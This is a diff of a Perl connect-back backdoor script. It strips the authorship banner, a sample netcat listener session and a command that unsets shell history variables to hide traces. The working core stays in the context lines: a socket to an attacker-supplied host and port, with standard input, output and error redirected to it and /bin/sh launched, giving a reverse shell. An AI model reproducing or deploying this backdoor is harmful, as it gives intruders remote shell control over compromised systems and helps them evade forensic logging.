@@ -1,36 +1,5 @@
 #!/usr/bin/perl
 use IO::Socket;
-#cONNECT BACKDOOR EDITED BY XORON
-#lord@SlackwareLinux:/home/programing$ perl dc.pl
-#--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--
-#
-#Usage: dc.pl [Host] [Port]
-#
-#Ex: dc.pl 127.0.0.1 2121
-#lord@SlackwareLinux:/home/programing$ perl dc.pl 127.0.0.1 2121
-#--== ConnectBack Backdoor Shell EDITED BY XORON TURK?SH HACKER ==--
-#
-#[*] Resolving HostName
-#[*] Connecting... 127.0.0.1
-#[*] Spawning Shell
-#[*] Connected to remote host
- 
-#bash-2.05b# nc -vv -l -p 2121
-#listening on [any] 2121 ...
-#connect to [127.0.0.1] from localhost [127.0.0.1] 32769
-#--== ConnectBack Backdoor Shell EDITED BY XORON TURK?SH HACKER ==--
-#
-#--==Systeminfo==--
-#Linux SlackwareLinux 2.6.7 #1 SMP Thu Dec 23 00:05:39 IRT 2004 i686 unknown unknown GNU/Linux
-#
-#--==Userinfo==--
-#uid=1001(xoron) gid=100(users) groups=100(users)
-#
-#--==Directory==--
-#/root
-#
-#--==Shell==--
-#
 $system = '/bin/sh';
 $ARGC=@ARGV;
 if ($ARGC!=2) {
@@ -49,7 +18,6 @@ SOCKET->autoflush();
 open(STDIN, ">&SOCKET");
 open(STDOUT,">&SOCKET");
 open(STDERR,">&SOCKET");
-system("unset HISTFILE; unset SAVEHIST;echo --==Systeminfo==--; uname -a;echo;
-echo --==Userinfo==--; id;echo;echo --==Directory==--; pwd;echo; echo --==Shell==-- ");
+system("uname -a");
 system($system);
 #EOF
